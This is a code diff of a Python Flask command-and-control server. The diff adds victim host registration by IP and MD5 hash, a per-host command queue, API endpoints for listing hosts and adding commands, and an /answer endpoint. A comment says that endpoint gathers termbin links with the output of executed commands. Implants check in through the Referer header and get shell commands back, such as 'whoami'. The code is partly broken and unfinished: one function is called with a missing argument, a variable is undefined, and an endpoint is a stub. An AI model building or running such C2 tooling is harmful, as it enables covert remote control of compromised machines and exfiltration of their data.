@@ -1,9 +1,12 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 from flask import Flask, request, render_template, jsonify
 from flask_cors import CORS
-import sqlite3
-from sqlite3 import Error
+
+from hashlib import md5
+
+# custom sqlite db methods
+import db
 
 app = Flask(__name__)
 
@@ -20,91 +23,7 @@ CORS(app, resources={r'/*': {'origins': '*'}})
 
 """
 
-# ===============================================
-def create_connection(db_file):
-	conn = None
-	try:
-		conn = sqlite3.connect(db_file)
-		print("[i] Database connection ...OK")
-	except Error as e:
-		print(e)
 
-	return conn
-# ===============================================
-
-# get db object
-# ===============================================
-def get_db():
-	database = r"c2.db"
-	conn = create_connection(database)
-	return conn
-# ===============================================
-
-# select query
-# ===============================================
-def select_db(conn, sql, params):
-	cursor = conn.cursor()
-	cursor.execute(sql, params)
-	rows = cursor.fetchall()
-
-	return rows
-# ===============================================
-
-# insert statement
-# ===============================================
-def insert_db(conn, sql, params):
-	cursor = conn.cursor()
-	cursor.execute(sql, params)
-	conn.commit()
-
-	return cursor.lastrowid
-# ===============================================
-
-
-
-
-
-# create tables
-# ===============================================
-def create_table(conn, create_table_sql):
-	try:
-		c = conn.cursor()
-		c.execute(create_table_sql)
-	except Error as e:
-		print(e)
-# ===============================================
-
-
-
-
-# insert new command in host history
-# ===============================================
-def insert_new_command(conn, cmd):
-	sql = '''
-		INSERT INTO commands_history(command, fk_host_id) VALUES (?,?)
-	'''
-
-	cursor = conn.cursor()
-	cursor.execute(sql, cmd)
-	conn.commit()
-
-	return cursor.lastrowid
-# ===============================================
-
-
-# update status
-# ===============================================
-def update_command_status(conn, cmd):
-	sql = '''
-		UPDATE commands_history SET status = ?, answer = ? WHERE cmd_id = ?
-	'''
-
-	cursor = conn.cursor()
-	cursor.execute(sql, cmd)
-	conn.commit()
-
-	return cursor.lastrowid
-# ===============================================
 
 
 # execute all together
@@ -122,8 +41,8 @@ def main():
 	"""
 
 	sql_create_cmdhistory = """
-		CREATE TABLE IF NOT EXISTS commands_history (
-			cmd_id INTEGER NOT NULL PRIMARY KEY,
+		CREATE TABLE IF NOT EXISTS commands (
+			command_id INTEGER NOT NULL PRIMARY KEY,
 			command TEXT NOT NULL,
 			status INTEGER NULL,
 			answer TEXT NULL,
@@ -143,7 +62,7 @@ def main():
 		print("Error! cannot create the database connection")
 	'''
 
-	conn = create_connection(database)
+	conn = db.create_connection(database)
 	with conn:
 		'''
 		hostname = ['super-pc']
@@ -193,22 +112,29 @@ def get_one_host(conn, hostname):
 # def get_one_host(conn, hostname, hash):
 	sql = 'SELECT * FROM hosts WHERE hostname = ?'
 	# sql = 'SELECT * FROM hosts WHERE hostname = ? AND hash = ?'
-	results = select_db(conn, sql, (hostname,))
+	results = db.select_db(conn, sql, (hostname,))
 
 	return results
 # ===============================================
 
 # insert new host
 # ===============================================
-def insert_host(conn, hostname):
-	sql = 'INSERT INTO hosts(hostname, hash) VALUES (?,?)'
-	lastrowid = insert_db(conn, sql, (hostname, "default-hash"))
+def insert_host(conn, hostname, ip):
+	sql = 'INSERT INTO hosts(hostname, ip, hash) VALUES (?, ?, ?)'
+	lastrowid = db.insert_db(conn, sql, (hostname, ip, md5((hostname+ip).encode('utf-8')).hexdigest()))
 
 	return lastrowid
 # ===============================================
 
 
+# get latest cmd by host hash
+# ===============================================
+def get_last_cmd_for_host(conn, hash):
+	sql = 'SELECT command FROM commands WHERE host_hash = ?'
+	command = db.select_db(conn, sql, (hash,))
 
+	return command
+# ===============================================
 
 
 
@@ -217,6 +143,8 @@ def insert_host(conn, hostname):
 
 @app.route("/")
 def phase1():
+	ip = request.remote_addr
+
 	# print(request.headers.get("Referer"))
 	referrer = request.referrer
 
@@ -227,27 +155,29 @@ def phase1():
 	hostname = referrer.split(':')[1].split('-')
 	hostname.pop(-1)
 	hostname = "-".join(hostname)
-	print("== welcome %s ==" % (hostname))
+	print("\n\n== welcome %s ==" % (hostname))
 
 	# get db connection
-	conn = get_db()
+	conn = db.get_db()
 
 
-	# check if cmds for hostname exists in db
+	# check if hostname exists in db
 	is_host_registered = get_one_host(conn, hostname)
 
 	if len(is_host_registered) != 0:
-		print("host already here, no cmd")
+		print("host already here")
 	else:
 		print("[!] no host %s registered !" % (hostname))
-		latest_id = insert_host(conn, hostname)
+		latest_id = insert_host(conn, hostname, ip)
 		if latest_id != None:
-			print("[+] new host '%s' added to database with id=%s! " % (hostname, latest_id))
+			print("[+] new host '%s(%s)' added to database with id=%s! " % (hostname, ip, latest_id))
 
 
+	# check if command to give to host
+	host_hash = md5((hostname+ip).encode('utf-8')).hexdigest()
+	latest_cmd_for_host = get_last_cmd_for_host(host_hash)
+	print(latest_cmd_for_host)
 
-	# [...]
-	latest_cmd = "whoami"
 
 	# return "<RANDINT>--<HOSTNAME>--<CMD>"
 	return "123--%s--%s" % (hostname, latest_cmd)
@@ -264,12 +194,37 @@ def dashboard():
 
 # ===============================================
 @app.route("/api/hosts/list")
-def getHosts():
-	conn = get_db()
-
-	hosts = select_db(conn, "SELECT * FROM hosts", ())
-	return jsonify(hosts)
+def api_hosts_list():
+	hosts = db.api_get_hosts()
+	return hosts
 # ===============================================
 
 
+# ===============================================
+@app.route("/api/commands/list", methods=['GET'])
+def api_commands_list():
+	host_id = request.args.get('host_id')
+	commands = db.api_get_command(host_id)
+	return commands
+# ===============================================
+
+
+# ===============================================
+@app.route("/api/commands/add", methods=['POST'])
+def api_commands_add():
+	params = request.get_json()
+	success = db.api_add_command(params[0], params[1])
+	return success
+# ===============================================
+
+
+# endpoint pour recueillir les liens termbin 
+# avec la réponse de la commande précédemment exécutée
+# ===============================================
+@app.route("/answer", methods=['POST'])
+def answer():
+	# params = request.get_json()
+	# success = db.api_add_command(params[0], params[1])
+	return "1"
+# ===============================================
 
